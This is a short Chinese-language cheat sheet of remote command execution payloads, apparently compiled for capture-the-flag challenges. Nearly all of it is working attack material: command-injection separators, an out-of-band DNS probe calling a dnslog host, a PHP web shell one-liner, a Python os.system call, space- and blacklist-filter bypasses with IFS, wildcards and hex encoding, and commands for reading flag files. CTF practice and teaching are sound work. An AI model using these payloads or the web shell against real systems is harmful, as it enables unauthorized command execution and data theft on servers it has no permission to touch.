# RCE远程命令执行解题经验

## 检测方法

1. **命令注入**:
   - 参数注入: `;id`, `|whoami`, `` `id` ``
   -  DNS注入: `$(dig xxx.dnslog.cn)`

2. **代码执行**:
   - PHP: `<?php system($_GET['cmd']);?>`
   - Python: `__import__('os').system('id')`

## 常用Payload

### 命令拼接
```
; cat /flag
| cat /flag
`cat /flag`
$(cat /flag)
```

### 绕过空格过滤
```
cat${IFS}/flag
cat$IFS$9/flag
{cat,/flag}
```

### 绕过黑名单
```
/???/c?t /flag  # /bin/cat /flag
$(printf '\x2f\x66\x6c\x61\x67')  # hex编码
```

## 常见漏洞点

- 文件上传功能
- 系统命令执行
- 反序列化
- 代码执行函数 (eval, assert)

## 获取Flag

```bash
# 常见flag位置
/flag
/flag.txt
/var/www/html/flag.txt
/secret/flag

# 读取命令
cat /flag
tac /flag
head /flag
```
